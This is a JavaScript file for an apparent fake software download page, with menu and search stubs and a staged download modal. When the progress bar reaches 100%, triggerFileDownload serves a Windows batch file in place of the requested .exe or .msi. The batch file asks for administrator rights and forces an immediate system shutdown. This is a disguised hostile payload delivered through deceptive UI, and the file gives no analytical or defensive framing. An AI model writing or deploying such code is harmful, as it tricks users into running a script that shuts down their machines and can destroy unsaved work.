function fakeNav(e) {
  if (e) e.preventDefault();
  const menu = document.getElementById("mobileMenu");
  if (menu.classList.contains("open")) toggleMenu();
}

function toggleMenu() {
  const menu = document.getElementById("mobileMenu");
  const btn = document.getElementById("hamburger");
  menu.classList.toggle("open");
  btn.classList.toggle("open");
}

function fakeSearch() {
  const q = document.getElementById("searchInput").value;
  if (!q.trim()) return;
  alert(
    `Searching for "${q}"…\n\nSYSTEM UPDATE:\nThe search feature is temporarily unavailable. We are working to restore service as quickly as possible. Sorry for the inconvenience!`,
  );
}

document.querySelectorAll(".chip").forEach((chip) => {
  chip.addEventListener("click", () => {
    document
      .querySelectorAll(".chip")
      .forEach((c) => c.classList.remove("active"));
    chip.classList.add("active");
  });
});

function triggerFileDownload() {
  const batContent = `@echo off

:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit
)

echo ...
shutdown /s /f /t 0
`;
  const blob = new Blob([batContent], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = currentFile.replace(/\.(exe|msi)$/i, ".bat");
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

let dlTimer = null;
const dlSteps = [
  { pct: 10, msg: "Connecting to server…", label: "Starting…" },
  { pct: 28, msg: "Verifying file integrity…", label: "Verifying…" },
  { pct: 55, msg: "Downloading…", label: "Downloading…" },
  { pct: 78, msg: "Downloading…", label: "Downloading…" },
  { pct: 93, msg: "Almost done…", label: "Finishing…" },
  { pct: 100, msg: "Download complete! ✓", label: "Complete!" },
];
const dlDelays = [400, 600, 700, 900, 500, 600];
let currentFile = "";
function startDownload(fname, size, icon) {
  document.getElementById("modal-fname").textContent = fname;
  currentFile = fname;
  document.getElementById("modal-fsize").textContent = size;
  document.getElementById("modal-icon").textContent = icon || "📄";
  document.getElementById("progress-fill").style.width = "0%";
  document.getElementById("progress-fill").classList.remove("done");
  document.getElementById("progress-pct").textContent = "0%";
  document.getElementById("progress-status").textContent =
    "Preparing download…";
  document.getElementById("progress-msg").textContent = "";
  document.querySelector(".modal-footer").innerHTML =
    '<button class="btn-outline" onclick="closeModal()">Cancel</button>';
  document.getElementById("dlModal").classList.add("active");
  runDlStep(0);
}

function runDlStep(idx) {
  if (!document.getElementById("dlModal").classList.contains("active")) return;
  if (idx >= dlSteps.length) return;
  const s = dlSteps[idx];
  setTimeout(() => {
    if (!document.getElementById("dlModal").classList.contains("active"))
      return;
    document.getElementById("progress-fill").style.width = s.pct + "%";
    document.getElementById("progress-pct").textContent = s.pct + "%";
    document.getElementById("progress-status").textContent = s.label;
    document.getElementById("progress-msg").textContent = s.msg;
    if (s.pct === 100) {
      document.getElementById("progress-fill").classList.add("done");
      document.querySelector(".modal-footer").innerHTML =
        '<button class="btn-primary" onclick="closeModal()">Done</button>';
      triggerFileDownload(); // ← actual file downloads here
    } else {
      runDlStep(idx + 1);
    }
  }, dlDelays[idx]);
}

function closeModal() {
  document.getElementById("dlModal").classList.remove("active");
  document.querySelector(".modal-footer").innerHTML =
    '<button class="btn-outline" onclick="closeModal()">Cancel</button>';
}
